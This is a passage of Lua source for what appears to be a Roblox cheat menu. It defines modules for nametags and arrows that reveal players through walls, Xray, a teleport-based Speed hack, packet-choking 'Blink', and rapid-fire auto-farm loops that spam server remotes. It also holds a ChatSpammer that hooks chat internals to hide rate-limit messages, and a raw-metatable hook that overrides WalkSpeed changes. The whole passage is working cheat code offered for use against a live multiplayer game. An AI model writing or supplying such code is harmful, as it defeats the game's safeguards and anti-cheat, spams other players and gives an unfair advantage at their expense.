										nametagsfolderdrawing[plr.Name] = {}
										nametagsfolderdrawing[plr.Name].Text = Drawing.new("Text")
										nametagsfolderdrawing[plr.Name].Text.Size = 17	
										nametagsfolderdrawing[plr.Name].Text.Font = 0
										nametagsfolderdrawing[plr.Name].Text.Text = ""
										nametagsfolderdrawing[plr.Name].Text.ZIndex = 2
										nametagsfolderdrawing[plr.Name].BG = Drawing.new("Square")
										nametagsfolderdrawing[plr.Name].BG.Filled = true
										nametagsfolderdrawing[plr.Name].BG.Transparency = 0.5
										nametagsfolderdrawing[plr.Name].BG.Color = Color3.new(0, 0, 0)
										nametagsfolderdrawing[plr.Name].BG.ZIndex = 1
										thing = nametagsfolderdrawing[plr.Name]
									end

									if isAlive(plr) and plr ~= lplr and (NameTagsTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										local headPos, headVis = cam:WorldToViewportPoint((plr.Character.HumanoidRootPart:GetRenderCFrame() * CFrame.new(0, plr.Character.Head.Size.Y + plr.Character.HumanoidRootPart.Size.Y, 0)).Position)

										if headVis then
											local displaynamestr = (NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name)
											local blocksaway = math.floor(((plr.isAlive and plr.character.HumanoidRootPart.Position or Vector3.new(0,0,0)) - plr.Character.HumanoidRootPart.Position).magnitude / 3)
											local color = HealthbarColorTransferFunction(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
											thing.Text.Text = (NameTagsDistance["Enabled"] and plr.isAlive and '['..blocksaway..'] ' or '')..displaynamestr..(NameTagsHealth["Enabled"] and ' '..math.floor(plr.Character.Humanoid.Health).."" or '')
											thing.Text.Size = 17 * (NameTagsScale["Value"] / 10)
											thing.Text.Color = getPlayerColor(plr) or Color3.fromHSV(NameTagsColor["Hue"], NameTagsColor["Sat"], NameTagsColor["Value"])
											thing.Text.Visible = headVis
											thing.Text.Font = (math.clamp((table.find(fontitems, NameTagsFont["Value"]) or 1) - 1, 0, 3))
											thing.Text.Position = floorpos(Vector2.new(headPos.X - thing.Text.TextBounds.X / 2, (headPos.Y - thing.Text.TextBounds.Y)))
											thing.BG.Visible = headVis and NameTagsBackground["Enabled"]
											thing.BG.Size = floorpos(Vector2.new(thing.Text.TextBounds.X + 4, thing.Text.TextBounds.Y))
											thing.BG.Position = floorpos(Vector2.new((headPos.X - 2) - thing.Text.TextBounds.X / 2, (headPos.Y - thing.Text.TextBounds.Y) + 1.5))
										end
									end
								else
									if NameTagsFolder:FindFirstChild(plr.Name) then
										thing = NameTagsFolder[plr.Name]
										thing.Visible = false
									else
										thing = Instance.new("TextLabel")
										thing.BackgroundTransparency = 0.5
										thing.BackgroundColor3 = Color3.new(0, 0, 0)
										thing.BorderSizePixel = 0
										thing.Visible = false
										thing.RichText = true
										thing.Name = plr.Name
										thing.Font = Enum.Font.SourceSans
										thing.TextSize = 14
										if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("HumanoidRootPart") then
											local rawText = (NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name)
											if NameTagsHealth["Enabled"] then
												rawText = (NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name).." "..math.floor(plr.Character.Humanoid.Health)
											end
											local color = HealthbarColorTransferFunction(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
											local modifiedText = (NameTagsDistance["Enabled"] and plr.isAlive and '<font color="rgb(85, 255, 85)">[</font>'..math.floor((plr.character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)..'<font color="rgb(85, 255, 85)">]</font> ' or '')..(NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name)..(NameTagsHealth["Enabled"] and ' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.floor(plr.Character.Humanoid.Health).."</font>" or '')
											local nametagSize = game:GetService("TextService"):GetTextSize(rawText, thing.TextSize, thing.Font, Vector2.new(100000, 100000))
											thing.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
											thing.Text = modifiedText
										else
											local nametagSize = game:GetService("TextService"):GetTextSize(plr.Name, thing.TextSize, thing.Font, Vector2.new(100000, 100000))
											thing.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
											thing.Text = plr.Name
										end
										thing.TextColor3 = getPlayerColor(plr) or Color3.fromHSV(NameTagsColor["Hue"], NameTagsColor["Sat"], NameTagsColor["Value"])
										thing.Parent = NameTagsFolder
									end

									if isAlive(plr) and plr ~= lplr and (NameTagsTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										local headPos, headVis = cam:WorldToViewportPoint((plr.Character.HumanoidRootPart:GetRenderCFrame() * CFrame.new(0, plr.Character.Head.Size.Y + plr.Character.HumanoidRootPart.Size.Y, 0)).Position)
										headPos = headPos

										if headVis then
											local rawText = (NameTagsDistance["Enabled"] and plr.Character.isAlive and "["..math.floor((plr.character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude).."] " or "")..(NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name)..(NameTagsHealth["Enabled"] and " "..math.floor(plr.Character.Humanoid.Health) or "")
											local color = HealthbarColorTransferFunction(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
											local modifiedText = (NameTagsDistance["Enabled"] and plr.isAlive and '<font color="rgb(85, 255, 85)">[</font><font color="rgb(255, 255, 255)">'..math.floor((plr.character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude)..'</font><font color="rgb(85, 255, 85)">]</font> ' or '')..(NameTagsDisplayName["Enabled"] and plr.DisplayName ~= nil and plr.DisplayName or plr.Name)..(NameTagsHealth["Enabled"] and ' <font color="rgb('..tostring(math.floor(color.R * 255))..','..tostring(math.floor(color.G * 255))..','..tostring(math.floor(color.B * 255))..')">'..math.floor(plr.Character.Humanoid.Health).."</font>" or '')
											local nametagSize = game:GetService("TextService"):GetTextSize(rawText, thing.TextSize, thing.Font, Vector2.new(100000, 100000))
											thing.Size = UDim2.new(0, nametagSize.X + 4, 0, nametagSize.Y)
											thing.Text = modifiedText
											thing.Font = Enum.Font[NameTagsFont["Value"]]
											thing.TextSize = 14 * (NameTagsScale["Value"] / 10)
											thing.BackgroundTransparency = NameTagsBackground["Enabled"] and 0.5 or 1
											thing.TextColor3 = getPlayerColor(plr) or Color3.fromHSV(NameTagsColor["Hue"], NameTagsColor["Sat"], NameTagsColor["Value"])
											thing.Visible = headVis
											thing.Position = UDim2.new(0, headPos.X - thing.Size.X.Offset / 2, 0, (headPos.Y - thing.Size.Y.Offset) - 36)
										end
									end
								end
							end
						end)
					end)
				else
					UnbindFromRenderStep("NameTags")
					NameTagsFolder:ClearAllChildren()
					for i,v in pairs(nametagsfolderdrawing) do 
						pcall(function()
							nametagsfolderdrawing[i].Text:Remove()
							nametagsfolderdrawing[i].BG:Remove()
							nametagsfolderdrawing[i] = nil
						end)
					end
				end
			end,
			["HoverText"] = "Renders nametags on entities through walls."
		})
		for i,v in pairs(Enum.Font:GetEnumItems()) do 
			if v.Name ~= "SourceSans" then 
				table.insert(fontitems, v.Name)
			end
		end
		NameTagsFont = NameTags.CreateDropdown({
			["Name"] = "Font",
			["List"] = fontitems,
			["Function"] = function() end,
		})
		NameTagsColor = NameTags.CreateColorSlider({
			["Name"] = "Player Color", 
			["Function"] = function(val) end
		})
		NameTagsScale = NameTags.CreateSlider({
			["Name"] = "Scale",
			["Function"] = function(val) end,
			["Default"] = 10,
			["Min"] = 1,
			["Max"] = 50
		})
		NameTagsBackground = NameTags.CreateToggle({
			["Name"] = "Background", 
			["Function"] = function() end,
			["Default"] = true
		})
		NameTagsDisplayName = NameTags.CreateToggle({
			["Name"] = "Use Display Name", 
			["Function"] = function() end,
			["Default"] = true
		})
		NameTagsHealth = NameTags.CreateToggle({
			["Name"] = "Health", 
			["Function"] = function() end
		})
		NameTagsDistance = NameTags.CreateToggle({
			["Name"] = "Distance", 
			["Function"] = function() end
		})

	end)

	runcode(function()
		local Panic = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Panic", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						for i,v in pairs(GuiLibrary["ObjectsThatCanBeSaved"]) do
							if v["Type"] == "Button" or v["Type"] == "OptionsButton" then
								if v["Api"]["Enabled"] then
									v["Api"]["ToggleButton"]()
								end
							end
						end
					end)

				end
			end
		})

	end) 

	runcode(function()
		local ArrowsFolder = Instance.new("Folder")
		ArrowsFolder.Name = "ArrowsFolder"
		ArrowsFolder.Parent = GuiLibrary["MainGui"]
		players.PlayerRemoving:connect(function(plr)
			if ArrowsFolder:FindFirstChild(plr.Name) then
				ArrowsFolder[plr.Name]:Remove()
			end
		end)
		local ArrowsColor = {["Value"] = 0.44}
		local ArrowsScale = {["Value"] = 600}
		local ArrowsTeammate = {["Enabled"] = true}
		local Arrows = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Arrows", 
			["Function"] = function(callback) 
				if callback then
					spawn(function()
						BindToRenderStep("Arrows", 10, function()

							for i,plr in pairs(players:GetChildren()) do
								local thing
								if ArrowsFolder:FindFirstChild(plr.Name) then
									thing = ArrowsFolder[plr.Name]
									thing.Visible = false
									thing.Size = UDim2.new(0, ArrowsScale.Value, 0, ArrowsScale.Value)
									thing.ImageColor3 = getPlayerColor(plr) or Color3.fromHSV(ArrowsColor["Hue"], ArrowsColor["Sat"], ArrowsColor["Value"])
								else
									thing = Instance.new("ImageLabel")
									thing.BackgroundTransparency = 1
									thing.BorderSizePixel = 0
									thing.Size = UDim2.new(0, ArrowsScale.Value, 0, ArrowsScale.Value)
									thing.AnchorPoint = Vector2.new(0.5, 0.5)
									thing.Position = UDim2.new(0.5, 0, 0.5, 0)
									thing.Visible = false
									thing.Image = "rbxassetid://9711420124"
									thing.Name = plr.Name
									thing.Parent = ArrowsFolder
								end

								if isAlive(plr) and plr ~= lplr and (ArrowsTeammate["Enabled"] or shared.vapeteamcheck(plr)) then
									local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
									local camcframeflat = CFrame.new(cam.CFrame.p, cam.CFrame.p + cam.CFrame.lookVector * Vector3.new(1, 0, 1))
									local pointRelativeToCamera = camcframeflat:pointToObjectSpace(plr.Character.HumanoidRootPart.Position)
									local unitRelativeVector = (pointRelativeToCamera * Vector3.new(1, 0, 1)).unit
									local rotation = math.atan2(unitRelativeVector.Z, unitRelativeVector.X)
									thing.Visible = not rootVis
									thing.Rotation = math.deg(rotation)
								end
							end
						end)
					end)
				else
					UnbindFromRenderStep("Arrows") 
					ArrowsFolder:ClearAllChildren()
				end
			end, 
			["HoverText"] = "Draws arrows on screen when entities\nare out of your field of view."
		})
		ArrowsColor = Arrows.CreateColorSlider({
			["Name"] = "Player Color", 
			["Function"] = function(val) end,
		})
		ArrowsScale = Arrows.CreateSlider({
			["Name"] = "Scale", 
			["Min"] = 1,
			["Max"] = 600, 
			["Function"] = function(val) end,
			["Default"] = 245
		})
	end)

	runcode(function()
		local XrayAdd
		local XrayTransparency = {["Value"] = 50}
		local Xray = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Xray", 
			["Function"] = function(callback) 
				if callback then
					spawn(function()
						XrayAdd = workspace.DescendantAdded:connect(function(v)
							if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") and not v.Parent.Parent:FindFirstChild("Humanoid") then
								v.LocalTransparencyModifier = XrayTransparency.Value / 100
							end
						end)
						for i, v in pairs(workspace:GetDescendants()) do
							if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") and not v.Parent.Parent:FindFirstChild("Humanoid") then
								v.LocalTransparencyModifier = XrayTransparency.Value / 100
							end
						end
					end)
				else
					for i, v in pairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") and not v.Parent.Parent:FindFirstChild("Humanoid") then
							v.LocalTransparencyModifier = 0
						end
					end
					XrayAdd:Disconnect()
				end
			end
		})
		XrayTransparency = Xray.CreateSlider({
			["Name"] = "Transparency", 
			["Min"] = 1,
			["Max"] = 100, 
			["Function"] = function(val) end,
			["Default"] = 50
		})

	end)

	runcode(function()
		local speedval = {["Value"] = 100}
		local speedmethod = {["Value"] = "AntiCheat A"}
		local speedmovemethod = {["Value"] = "MoveDirection"}
		local speeddelay = {["Value"] = 0.7}
		local speedwallcheck = {["Enabled"] = true}
		local speedjump = {["Enabled"] = false}
		local speedjumpheight = {["Value"] = 20}
		local speedjumpalways = {["Enabled"] = false}
		local speedup
		local speeddown
		local oldwalkspeed
		local w = 0
		local s = 0
		local a = 0
		local d = 0
		local bodyvelo
		local speeddelayval = tick()

		local speed = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Speed", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						speeddown = game:GetService("UserInputService").InputBegan:connect(function(input1)
							if game:GetService("UserInputService"):GetFocusedTextBox() == nil then
								if input1.KeyCode == Enum.KeyCode.W then
									w = true
								end
								if input1.KeyCode == Enum.KeyCode.S then
									s = true
								end
								if input1.KeyCode == Enum.KeyCode.A then
									a = true
								end
								if input1.KeyCode == Enum.KeyCode.D then
									d = true
								end
							end
						end)
						speedup = game:GetService("UserInputService").InputEnded:connect(function(input1)
							if input1.KeyCode == Enum.KeyCode.W then
								w = false
							end
							if input1.KeyCode == Enum.KeyCode.S then
								s = false
							end
							if input1.KeyCode == Enum.KeyCode.A then
								a = false
							end
							if input1.KeyCode == Enum.KeyCode.D then
								d = false
							end
						end)
						BindToStepped("Speed", 1, function(time, delta)
							if isAlive(game.Players.LocalPlayer) then
								local movevec = (speedmovemethod["Value"] == "Manual" and (not (w or s or a or d)) and Vector3.new(0, 0, 0) or game.Players.LocalPlayer.character.Humanoid.MoveDirection).Unit
								movevec = movevec == movevec and movevec or Vector3.new(0, 0, 0)
								if speedmethod["Value"] == "CFrame" then
									local newpos = (movevec * (math.clamp(speedval["Value"] - game.Players.LocalPlayer.character.Humanoid.WalkSpeed, 0, 1000000000) * delta))
									if speedwallcheck["Enabled"] then
										local raycastparameters = RaycastParams.new()
										raycastparameters.FilterDescendantsInstances = {lplr.Character}
										local ray = workspace:Raycast(game.Players.LocalPlayer.character.HumanoidRootPart.Position, newpos, raycastparameters)
										if ray then newpos = (ray.Position - game.Players.LocalPlayer.character.HumanoidRootPart.Position) end
									end
									game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame + newpos
								elseif speedmethod["Value"] == "TP" then
									if speeddelayval <= tick() then
										speeddelayval = tick() + (speeddelay["Value"] / 20)
										local newpos = (movevec * (math.clamp(speedval["Value"] / 1.5 - game.Players.LocalPlayer.character.Humanoid.WalkSpeed, 0, 1000000000)))
										if speedwallcheck["Enabled"] then
											local raycastparameters = RaycastParams.new()
											raycastparameters.FilterDescendantsInstances = {lplr.Character}
											local ray = workspace:Raycast(game.Players.LocalPlayer.character.HumanoidRootPart.Position, newpos, raycastparameters)
											if ray then newpos = (ray.Position - game.Players.LocalPlayer.character.HumanoidRootPart.Position) end
										end
										game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame + newpos
									end
								end
								if speedjump["Enabled"] and (speedjumpalways["Enabled"]) then
									if (game.Players.LocalPlayer.character.Humanoid.FloorMaterial ~= Enum.Material.Air) and game.Players.LocalPlayer.character.Humanoid.MoveDirection ~= Vector3.new(0, 0, 0) then
										game.Players.LocalPlayer.character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.character.HumanoidRootPart.Velocity.X, speedjumpheight["Value"], game.Players.LocalPlayer.character.HumanoidRootPart.Velocity.Z)
									end
								end
							end
						end)
					end)
				else
					speeddelayval = 0
					if speedup then
						speedup:Disconnect()
					end
					if speeddown then
						speeddown:Disconnect()
					end
					UnbindFromStepped("Speed")
				end
			end,
			["ExtraText"] = function() return speedmethod["Value"] end
		})
		speedmethod = speed.CreateDropdown({
			["Name"] = "Mode", 
			["List"] = {"CFrame", "TP"},
			["Function"] = function(val)
				speeddelay["Object"].Visible = val == "TP"
			end
		})
		speedmovemethod = speed.CreateDropdown({
			["Name"] = "Movement", 
			["List"] = {"MoveDirection", "Manual"},
			["Function"] = function(val) end
		})
		speedval = speed.CreateSlider({
			["Name"] = "Speed", 
			["Min"] = 1,
			["Max"] = 1000, 
			["Default"] = 100,
			["Function"] = function(val) end
		})
		speedjumpheight = speed.CreateSlider({
			["Name"] = "Jump Height",
			["Min"] = 0,
			["Max"] = 70,
			["Default"] = 50,
			["Function"] = function() end
		})
		speeddelay = speed.CreateSlider({
			["Name"] = "Delay", 
			["Min"] = 1,
			["Max"] = 50, 
			["Function"] = function(val)
				speeddelayval = tick() + (val / 10)
			end,
			["Default"] = 7
		})
		speedwallcheck = speed.CreateToggle({
			["Name"] = "Wall Check",
			["Function"] = function() end,
			["Default"] = true
		})
		speedjump = speed.CreateToggle({
			["Name"] = "AutoJump", 
			["Function"] = function(callback) 
				if speedjumpalways["Object"] then
					speedjump["Object"].ToggleArrow.Visible = callback
					speedjumpalways["Object"].Visible = callback
				end
			end,
			["Default"] = true
		})
		speedjumpalways = speed.CreateToggle({
			["Name"] = "Always Jump",
			["Function"] = function() end
		})
		speedjumpalways["Object"].BackgroundTransparency = 0
		speedjumpalways["Object"].BorderSizePixel = 0
		speedjumpalways["Object"].BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		speedjumpalways["Object"].Visible = speedjump["Enabled"]

	end)

	runcode(function()
		local ChatSpammer = {["Enabled"] = false}
		local ChatSpammerDelay = {["Value"] = 10}
		local ChatSpammerHideWait = {["Enabled"] = true}
		local ChatSpammerMessages = {["ObjectList"] = {}}
		local chatspammerfirstexecute = true
		local chatspammerhook = false
		local oldchanneltab
		local oldchannelfunc
		local oldchanneltabs = {}
		local waitnum = 0
		ChatSpammer = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "ChatSpammer",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						if chatspammerfirstexecute then
							lplr.PlayerGui:WaitForChild("Chat", 10)
						end
						if lplr.PlayerGui:FindFirstChild("Chat") and lplr.PlayerGui.Chat:FindFirstChild("Frame") and lplr.PlayerGui.Chat.Frame:FindFirstChild("ChatChannelParentFrame") and game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
							if chatspammerhook == false then
								spawn(function()
									chatspammerhook = true
									for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
										if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
											oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
											oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
											getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
												local tab = oldchannelfunc(Self, Name)
												if tab and tab.AddMessageToChannel then
													local addmessage = tab.AddMessageToChannel
													if oldchanneltabs[tab] == nil then
														oldchanneltabs[tab] = tab.AddMessageToChannel
													end
													tab.AddMessageToChannel = function(Self2, MessageData)
														if MessageData.MessageType == "System" then
															if MessageData.Message:find("You must wait") and ChatSpammer["Enabled"] then
																return nil
															end
														end
														return addmessage(Self2, MessageData)
													end
												end
												return tab
											end
										end
									end
								end)
							end
							spawn(function()
								repeat
									if ChatSpammer["Enabled"] then
										pcall(function()
											game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((#ChatSpammerMessages["ObjectList"] > 0 and ChatSpammerMessages["ObjectList"][math.random(1, #ChatSpammerMessages["ObjectList"])] or "uhhh"), "All")
										end)
									end
									if waitnum ~= 0 then
										wait(waitnum)
										waitnum = 0
									else
										wait(ChatSpammerDelay["Value"] / 10)
									end
								until ChatSpammer["Enabled"] == false
							end)
						else
							createwarning("ChatSpammer", "Default chat not found.", 3)
							if ChatSpammer["Enabled"] then
								ChatSpammer["ToggleButton"](false)
							end
						end
					end)
				else
					waitnum = 0
				end
			end,
			["HoverText"] = "Spams chat with text of your choice (Default Chat Only)"
		})
		ChatSpammerDelay = ChatSpammer.CreateSlider({
			["Name"] = "Delay",
			["Min"] = 1,
			["Max"] = 50,
			["Default"] = 10,
			["Function"] = function() end
		})
		ChatSpammerHideWait = ChatSpammer.CreateToggle({
			["Name"] = "Hide Wait Message",
			["Function"] = function() end,
			["Default"] = true
		})
		ChatSpammerMessages = ChatSpammer.CreateTextList({
			["Name"] = "Message",
			["TempText"] = "message to spam",
			["Function"] = function() end
		})

	end)

	runcode(function()
		local NoSlowDown = {["Enabled"] = false}

		NoSlowDown = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "NoSlowdown",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						if NoSlowDown.Enabled == true then
							local newindex = getrawmetatable(game).__newindex;
							setreadonly(getrawmetatable(game),false);

							getrawmetatable(game).__newindex = function(t,i,v)
								if i=="WalkSpeed" and not checkcaller() and NoSlowDown.Enabled == true then
									return newindex(t,i,16);
								end
								return newindex(t,i,v);
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "cant be slown on water",
			["Default"] = false,
			
		})

	end)

	runcode(function()
		local OpenCrate2 = {["Enabled"] = false}
		local CrateDelay2 = {["Value"] = 10}
		local KindOfCrate2 = {["Value"] = "AutoSpawnChest"}
		OpenCrate2 = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoDropChest",
			["Function"] = function(callback) if callback then 
					spawn(function()
						while wait(1 / CrateDelay2.Value) and OpenCrate2.Enabled == true do
							local args = {
								[1] = KindOfCrate2
							}

							game:GetService("ReplicatedStorage").Events.ChestDrop:FireServer(unpack(args))

						end
					end)

				else
				end
			end,
			["HoverText"] = "keep opening crates", 
			["Default"] = false,
			["ExtraText"] = function() return " Placeholder" end
		})
		CrateDelay2 = OpenCrate2.CreateSlider({
			["Name"] = "Delay",
			["Min"] = 10,
			["Max"] = 500,
			["Function"] = function(val)
			end,
			["HoverText"] = "every 10 on the slider is 0.1 seconds",
			["Default"] = 100
		})
		KindOfCrate2 = OpenCrate2.CreateDropdown({
			["Name"] = "Select Chest",
			["List"] = {"Food Chest", 
				"Resource Chest",
				"Essence Chest",
				"Crystal Chest",
				"Adurite Chest",
				"Magnetite Chest",
			},
			["Function"] = function(val)
			end
		})
	end)
	runcode(function()
		local AutoDrop = {["Enabled"] = false}
		local AutoDropItem = {["RefreshValues"] = function() end, ["ObjectList"] = {}}

		AutoDrop = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoDrop",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and AutoDrop.Enabled == true do
							game:GetService("ReplicatedStorage").Events.DropBagItem:FireServer(AutoDropItem["ObjectList"][math.random(1, #AutoDropItem["ObjectList"])])
						end
					end)
				else
				end
			end,
			["HoverText"] = "Auto drop if you need to drop items fast and your tired",
			["Default"] = false,
			
		})
		AutoDropItem = AutoDrop.CreateTextList({
			["Name"] = "Item",
			["TempText"] = "Item",
		})


	end)


	runcode(function()
		local Blink = {["Enabled"] = false}
		local BlinkIncoming = {["Enabled"] = false}

		Blink = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Blink",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0.01)
						if Blink["Enabled"] == true then 
							settings():GetService("NetworkSettings").IncomingReplicationLag = 99999999
						end
					end)

				else
					game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
					if Blink["Enabled"] == false then 
						settings():GetService("NetworkSettings").IncomingReplicationLag = 0
					end
				end
			end,
			["HoverText"] = "Chokes all incoming or outgoing packets",
			["Default"] = false,
			
		})
	end)


	runcode(function()
		local AutoPlant = {["Enabled"] = false}
		local PlantType = {["Value"] = "Apple"}
		local PlantDistance = {["Value"] = 30}

		AutoPlant = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoPlant",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while wait() and AutoPlant.Enabled == true do
							for i,v in pairs(workspace.Deployables:GetChildren()) do
								if v.Name == "Plant Box" then
									local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Reference.Position).Magnitude

									if distance <= PlantDistance.Value then
										local args = {
											[1] = v,
											[2] = PlantType.Value
										}

										game:GetService("ReplicatedStorage").Events.InteractStructure:FireServer(unpack(args))
									end
								end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Plant Faster oh yea they can overlap",
			["Default"] = false,
			
		})
		PlantType = AutoPlant.CreateDropdown({
			["Name"] = "Select Fruit",
			["List"] = {
				"Apple", 
				"Barley",
				"Cloudberry",
				"Sunfruit",
				"Berry",
				"Coconut",
				"Pear",
				"Bloodfruit",
				"Orange",
				"Bluefruit",
			},
			["Function"] = function(val)
			end
		})
		PlantDistance = AutoPlant.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 5,
			["Max"] = 30,
			["Function"] = function(val)
			end,
			["Default"] = 25
		})

	end)
	runcode(function()
		local AutoBreak = {["Enabled"] = false}

		AutoBreak = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoBreak",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						local mouse = game:GetService("Players").LocalPlayer:GetMouse()
						local breaking=false
						mouse.Button1Down:connect(function()
							breaking = true
							while breaking and AutoBreak.Enabled == true and wait(0.05) do
								local part = game:GetService("Players").LocalPlayer:GetMouse().Target
								local one = game:GetService("ReplicatedStorage").RelativeTime.Value
								local two = {part,part,part,part}
								game:GetService("ReplicatedStorage").Events.SwingTool:FireServer(one, two)
							end
						end)
						mouse.Button1Down:connect(function(key)
							breaking = false
						end)
					end)
				else
				end
			end,
			["HoverText"] = "Break resources faster",
			["Default"] = false,
			
		})

	end)

	runcode(function()
		local AutoPickup = {["Enabled"] = false}
		local grabfromchest = false
		local pickupRange = 25

		AutoPickup = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "PickupAura",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and AutoPickup.Enabled == true do
							local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
							if AutoPickup.Enabled == true then
								for i,v in pairs(game.Workspace.Items:GetChildren()) do
									if v.ClassName == "Model" then
										for _,p in pairs(v:GetChildren()) do
											if p.ClassName == "Part" or p.ClassName == "MeshPart" or p.ClassName == "UnionOperation" and AutoPickup.Enabled == true then
												local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
												if (MainCharacter.HumanoidRootPart.Position - p.Position).magnitude < pickupRange then
													game:GetService("ReplicatedStorage").Events.PickupItem:InvokeServer(v, v.ClassName)
												end
											end
										end
									end
								end
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "Auto pickups the item that is near you",
			["Default"] = false,
			
		})

		AutoPickup.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 5,
			["Max"] = 25,
			["Function"] = function(val)
				pickupRange = val
			end,
			["HoverText"] = "pickup everything in a 15 radius nah lets make it 25",
			["Default"] = 10
		})

	end)
	runcode(function()
		local AutoEat = {["Enabled"] = false}
		local AutoEatItem = {["Value"] = ""}
		local AutoEatCheck = {["Value"] = 90}

		AutoEat = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoEat",
			["Function"] = function(callback)
				if callback then
					spawn(function()

						while game:GetService("RunService").Heartbeat:Wait() and AutoEat.Enabled == true do
							local GetHunger = game.Players.LocalPlayer.PlayerGui.MainGui.Panels.Toolbar.Stats.PlayerStats.Hunger.Background.Size.X.Scale + game.Players.LocalPlayer.PlayerGui.MainGui.Panels.Toolbar.Stats.PlayerStats.Hunger.Background.Slider.Size.X.Scale * 99

							if GetHunger <= AutoEatCheck.Value then

								local args = {
									[1] = AutoEatItem.Value
								}

								game:GetService("ReplicatedStorage").Events.UseBagItem:FireServer(unpack(args))

							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "kinda good for being afk",
			["Default"] = false,
			
		})
		AutoEatItem = AutoEat.CreateTextBox({
			["Name"] = "Item",
			["TempText"] = "Item Name",
			["HoverText"] = "eat the item you want to eat"
		})
		AutoEatCheck = AutoEat.CreateSlider({
			["Name"] = "Hunger Check",
			["Min"] = 1,
			["Max"] = 90,
			["Function"] = function(val)
			end,
			["HoverText"] = "eat when below the ammount of hunger",
			["Default"] = 80
		})

	end)
	runcode(function()
		local AutoCraft = {["Enabled"] = false}
		local AutoCraftItem = {["RefreshValues"] = function() end, ["ObjectList"] = {}}

